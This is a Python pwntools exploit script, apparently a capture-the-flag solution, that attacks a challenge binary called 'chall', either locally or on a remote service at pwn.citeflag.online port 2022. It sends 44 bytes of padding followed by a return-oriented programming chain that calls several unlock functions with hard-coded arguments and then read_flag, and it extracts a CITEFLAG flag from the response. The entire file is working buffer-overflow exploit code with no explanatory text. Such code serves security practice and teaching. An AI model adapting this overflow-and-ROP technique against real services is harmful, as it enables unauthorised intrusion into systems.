#!/usr/bin/env python3
from pwn import *
import re

#─────────────────────────────────────────────────────────────────────────────
# 1) Configuration
#─────────────────────────────────────────────────────────────────────────────
context.log_level = 'ERROR'
exe = ELF("./chall")
context.binary  = exe
context.terminal = ["termite", "-e"]

OFFSET = 44

#─────────────────────────────────────────────────────────────────────────────
# 2) Connection helper
#─────────────────────────────────────────────────────────────────────────────
def conn():
    if args.LOCAL:
        return process([ exe.path ])
    else:
        return remote("pwn.citeflag.online", 2022)

#─────────────────────────────────────────────────────────────────────────────
# 3) Build & send ROP chain
#─────────────────────────────────────────────────────────────────────────────
def main():
    r = conn()

    flag_txt_addr = next(exe.search(b"flag.txt"))

    rop = ROP(exe)

    rop.call("find_file",  [ flag_txt_addr ])
    rop.call("unlock_one", [])
    rop.call("unlock_two", [ 0x12345678 ])
    rop.call("unlock_three", [ 0x1e9c66e6, 0xadaf1212 ])
    rop.call("read_flag",   [])

    payload  = b"A" * OFFSET
    payload += rop.chain()

    r.sendline(payload)
    data = r.recvall(timeout=2).decode(errors='ignore')
    m = re.search(r"(CITEFLAG\{.*?\})", data)
    if m:
        print(m.group(1))
    else:
        print("[-] Flag not found in output:")
        print(data)

if __name__ == "__main__":
    main()
